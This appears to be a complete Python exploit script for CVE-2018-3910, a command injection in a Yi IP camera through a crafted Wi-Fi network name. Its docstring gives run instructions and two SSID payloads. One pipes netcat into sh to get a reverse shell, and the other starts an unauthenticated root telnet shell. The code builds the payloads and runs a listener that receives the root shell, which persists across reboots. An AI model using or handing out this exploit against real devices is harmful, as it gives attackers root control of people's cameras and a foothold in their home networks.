#!/usr/bin/env python3
"""Yi IPC (Zowee, 192.168.6.156) CVE-2018-3910 proving kit — no card, no cable.

The camera joins the SSID we choose and later runs

    popen("/home/app/cloudAPI ... -ssid \\"%s\\"")

with the SSID unescaped inside double quotes, so `$( )` expands under `sh -c`.

Run order:
  1. `python3 yi_u1.py serve 192.168.4.160`  — listener on 4444, prints the shell
  2. broadcast the SSID it prints (AP or Internet Sharing), power-cycle the camera,
     and re-provision it in the Yi app to that SSID
  3. the camera dials back and the shell is root; run `id`, then `reboot` to prove
     the payload re-fires on every boot while the SSID is unchanged

Payloads (802.11 caps SSID at 32 octets):
  primary  x$(nc <host> 4444|sh)                28 octets
  fallback x";telnetd -l/bin/sh;#               22 octets
"""
import socket
import sys
import threading

HOST = "192.168.4.160"
PORT = 4444

PRIMARY = "x$(" + f"nc {HOST} {PORT}" + "|sh)"
FALLBACK = 'x";telnetd -l/bin/sh;#'


def serve(port: int = PORT) -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, port))
    srv.listen(4)
    print(f"listening on {HOST}:{port}", flush=True)
    conn, addr = srv.accept()
    print(f"shell from {addr}", flush=True)

    def pump(src, dst):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.write(data)
                dst.flush()
        except OSError:
            pass

    if sys.stdin.isatty():
        threading.Thread(target=pump, args=(sys.stdin.buffer, conn), daemon=True).start()
    else:
        print("(non-tty stdin: device output is logged only)", flush=True)
    pump(conn, sys.stdout.buffer)


def main() -> int:
    if len(sys.argv) > 1 and sys.argv[1] == "payloads":
        for name, p in (("primary", PRIMARY), ("fallback", FALLBACK)):
            print(f"{name}: {len(p)} octets  {p!r}  fits={len(p) <= 32}")
        return 0
    if len(sys.argv) > 1 and sys.argv[1] == "serve":
        if len(sys.argv) > 2:
            globals()["HOST"] = sys.argv[2]
        serve()
        return 0
    print(__doc__)
    return 0


if __name__ == "__main__":
    sys.exit(main())
